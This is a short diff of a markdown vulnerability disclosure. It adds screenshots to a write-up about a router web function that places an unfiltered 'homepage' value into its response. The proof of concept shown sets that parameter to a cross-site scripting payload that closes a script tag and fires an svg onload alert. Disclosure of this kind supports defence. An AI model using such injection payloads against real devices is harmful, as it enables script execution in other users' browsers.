@@ -30,6 +30,8 @@ This function defines a variable homepage, retrieves its value from the request 
 
 However，the sub_404F68 function creates a response packet and places the unfiltered value of the homepage into the packet.
 
+<div  align="center"><img src="./img/response.png" style="zoom:80%;" /></div>
+
 ## Proof of Concept (PoC)
 
 We set `homepage` as **main.shtml"></script><svg/onload=alert()><script>** ,such as:
@@ -54,6 +56,7 @@ newUI=1&page=login&username=admin&langChange=0&ipaddr=192.168.6.1&login_page=log
 
 ## outcome
 <div  align="center"><img src="./img/poc.png" style="zoom:80%;" /></div>
+
 
 
 
